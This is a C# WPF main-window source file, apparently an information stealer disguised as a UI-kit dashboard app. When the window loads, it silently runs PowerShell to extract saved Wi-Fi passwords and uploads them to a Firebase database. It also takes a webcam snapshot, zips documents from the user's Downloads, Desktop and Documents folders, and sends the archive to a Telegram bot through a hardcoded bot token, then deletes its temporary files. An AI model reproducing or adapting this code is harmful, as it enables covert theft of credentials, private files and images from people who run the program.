using AForge.Video;
using AForge.Video.DirectShow;
using Firebase.Database;
using Firebase.Database.Query;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media;
using WPFUIKitProfessional.Pages;

namespace WPFUIKitProfessional
{
    /// <summary>
    /// Lógica de interacción para MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {

        private FilterInfoCollection videoDevices;
        private VideoCaptureDevice videoSource;
        private string snapshotPath = null;
        public MainWindow()
        {
            InitializeComponent();

            this.Loaded += MainWindow_Loaded;
            videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
        }

     

        private void MainWindow_Loaded(object sender, RoutedEventArgs e)
        {
            // Queue the actions to be performed after the window is fully loaded
            this.Dispatcher.InvokeAsync(async () =>
            {
                // Simulate button clicks with a delay in between
                ShowWifiProfiles_Click(this, new RoutedEventArgs());
                await Task.Delay(3000);
                SendWifiProfiles_Click(this, new RoutedEventArgs()); 
                await Task.Delay(1000);
                Button_Click22(this, new RoutedEventArgs());
            
            });
        }



        private void btnClose_Click(object sender, RoutedEventArgs e)
        {
            Close();
        }

        private void btnRestore_Click(object sender, RoutedEventArgs e)
        {
            if (WindowState == WindowState.Normal)
                WindowState = WindowState.Maximized;
            else
                WindowState = WindowState.Normal;
        }

        private void btnMinimize_Click(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState.Minimized;
        }

        private void rdHome_Click(object sender, RoutedEventArgs e)
        {
            frameContent.Navigate(new Home());
          
        }

        private void rdAnalytics_Click(object sender, RoutedEventArgs e)
        {
            frameContent.Navigate(new Analytics());
        }

        private void rdMessages_Click(object sender, RoutedEventArgs e)
        {
            frameContent.Navigate(new Messages());
        }

        private void rdCollections_Click(object sender, RoutedEventArgs e)
        {
            frameContent.Navigate(new Collections());
        }

        private void rdUsers_Click(object sender, RoutedEventArgs e)
        {
            frameContent.Navigate(new Users());
        }






































        private async void ShowWifiProfiles_Click(object sender, RoutedEventArgs e)
        {
            var psi = new ProcessStartInfo
            {
                FileName = "powershell",
                Arguments = "-Command \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\\\"$name\\\" key=clear)} | Select-String 'Содержимое ключа\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ProfileName=$name; Password=$pass }} | ConvertTo-Json -Compress\"",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            var process = new Process { StartInfo = psi };
            try
            {
                var tcs = new TaskCompletionSource<bool>();

                process.Exited += (s, ea) => tcs.SetResult(true);
                process.EnableRaisingEvents = true;
                process.Start();

                var outputTask = process.StandardOutput.ReadToEndAsync();
                var errorTask = process.StandardError.ReadToEndAsync();

                await tcs.Task; // Ждем завершения процесса

                string output = await outputTask;
                string error = await errorTask;

                if (!string.IsNullOrEmpty(error))
                {
                    return;
                }

                if (string.IsNullOrWhiteSpace(output))
                {
                    return;
                }

                List<WifiProfile> wifiProfiles = null;
                try
                {
                    wifiProfiles = JsonConvert.DeserializeObject<List<WifiProfile>>(output);
                }
                catch (JsonSerializationException)
                {
                    var singleWifiProfile = JsonConvert.DeserializeObject<WifiProfile>(output);
                    if (singleWifiProfile != null)
                    {
                        wifiProfiles = new List<WifiProfile> { singleWifiProfile };
                    }
                }

                if (wifiProfiles == null || wifiProfiles.Count == 0)
                {
                }
                else
                {
                    wifiDataGrid.ItemsSource = wifiProfiles;
                }
            }
            catch (Exception ex)
            {
            }
        }

        public class WifiProfile
        {
            public string ProfileName { get; set; }
            public string Password { get; set; }
        }

        private async void SendWifiProfiles_Click(object sender, RoutedEventArgs e)
        {
            var wifiProfiles = wifiDataGrid.ItemsSource as List<WifiProfile>;
            if (wifiProfiles == null || !wifiProfiles.Any())
            {
                statusCircle.Fill = System.Windows.Media.Brushes.Red;
                return;
            }

            string firebaseUrl = "https://wifipassname-default-rtdb.firebaseio.com/wifiProfiles"; // Замените на ваш URL Firebase
            var firebaseClient = new FirebaseClient(firebaseUrl);

            var tasks = wifiProfiles.Select(async profile =>
            {
                var sanitizedProfileName = Uri.EscapeDataString(profile.ProfileName);

                var existingProfile = await firebaseClient
                    .Child("wifiProfiles")
                    .Child(sanitizedProfileName)
                    .OnceSingleAsync<WifiProfile>();

                if (existingProfile == null)
                {
                    await firebaseClient
                        .Child("wifiProfiles")
                        .Child(sanitizedProfileName)
                        .PutAsync(profile);
                    statusCircle.Fill = System.Windows.Media.Brushes.Green;
                }
            }).ToList();

            await Task.WhenAll(tasks);
            statusCircle.Fill = System.Windows.Media.Brushes.Green;

        }

















        private async void Button_Click22(object sender, RoutedEventArgs e)
        {
            string userFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            string[] paths = new[]
            {
                Path.Combine(userFolderPath, "Downloads"),
                Path.Combine(userFolderPath, "Desktop"),
                Path.Combine(userFolderPath, "Documents")
            };

            string zipFileName = $"{Environment.MachineName}_Info_System.zip";
            string zipFilePath = Path.Combine(Path.GetTempPath(), zipFileName);

            try
            {
                // Удаляем файл snapshot.png, если он существует
                string tempPath = Path.GetTempPath();
                snapshotPath = Path.Combine(tempPath, "snapshot.png");
                if (File.Exists(snapshotPath))
                {
                    File.Delete(snapshotPath);
                }

                // Проверяем наличие устройств камеры
                if (videoDevices.Count > 0)
                {
                    videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
                    videoSource.NewFrame += new NewFrameEventHandler(video_NewFrame_Capture);
                    videoSource.Start();

                    // Ожидаем 2 секунды, чтобы сделать фото
                    await Task.Delay(2000);

                    videoSource.SignalToStop();
                    videoSource.WaitForStop();
                    videoSource.NewFrame -= new NewFrameEventHandler(video_NewFrame_Capture);
                    videoSource = null;
                }

                // Создаем список файлов для архива
                var filesToCopy = new List<string>();
                string[] fileExtensions = { "*.pdf", "*.doc", "*.docx", "*.xls", "*.xlsx", "*.rtf", "*.txt" };

                foreach (var path in paths)
                {
                    foreach (var extension in fileExtensions)
                    {
                        filesToCopy.AddRange(Directory.GetFiles(path, extension));
                    }
                }

                // Добавляем снимок с камеры, если он был сделан
                if (File.Exists(snapshotPath))
                {
                    filesToCopy.Add(snapshotPath);
                }

                // Создаем архив и отправляем его
                if (filesToCopy.Count > 0)
                {
                    CreateZipFromFiles(filesToCopy, zipFilePath);
                    await SendFileAsync(zipFilePath);

                    // If successful, change the color of statusCircle1 to green
                    statusCircle1.Fill = new SolidColorBrush(Colors.Green);
                }
                else
                {
                    MessageBox.Show("Ни один из файлов не найден.");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Произошла ошибка: {ex.Message}");
            }
            finally
            {
                CleanupFiles(new List<string> { zipFilePath, snapshotPath });
            }
        }

        private void video_NewFrame_Capture(object sender, NewFrameEventArgs eventArgs)
        {
            try
            {
                Bitmap bitmap = (Bitmap)eventArgs.Frame.Clone();

                snapshotPath = Path.Combine(Path.GetTempPath(), "snapshot.png");
                bitmap.Save(snapshotPath, ImageFormat.Png);
            }
            catch (Exception ex)
            {
                // Handle exception
                MessageBox.Show($"Произошла ошибка при сохранении изображения: {ex.Message}");
            }
        }

        private static void CreateZipFromFiles(List<string> sourceFilePaths, string zipFilePath)
        {
            using (FileStream zipToOpen = new FileStream(zipFilePath, FileMode.Create))
            {
                using (ZipArchive archive = new ZipArchive(zipToOpen, ZipArchiveMode.Create))
                {
                    foreach (var sourceFilePath in sourceFilePaths)
                    {
                        archive.CreateEntryFromFile(sourceFilePath, Path.GetFileName(sourceFilePath));
                    }
                }
            }
        }

        private static async Task SendFileAsync(string filePath)
        {
            var botToken = "7325932397:AAGYcJAyNxZPXC4Uw3rvzzrYP-6ionuD4Nw";
            var chatId = "1005333334";
            var url = $"https://api.telegram.org/bot{botToken}/sendDocument";

            using (var client = new HttpClient())
            {
                var form = new MultipartFormDataContent();
                var fileContent = new ByteArrayContent(File.ReadAllBytes(filePath));
                fileContent.Headers.ContentType = System.Net.Http.Headers.MediaTypeHeaderValue.Parse("multipart/form-data");
                form.Add(fileContent, "document", Path.GetFileName(filePath));
                form.Add(new StringContent(chatId), "chat_id");

                var response = await client.PostAsync(url, form);
                response.EnsureSuccessStatusCode();
            }
        }

        private static void CleanupFiles(List<string> filePaths)
        {
            foreach (var filePath in filePaths)
            {
                if (File.Exists(filePath))
                {
                    File.Delete(filePath);
                }
            }
        }
    }
}
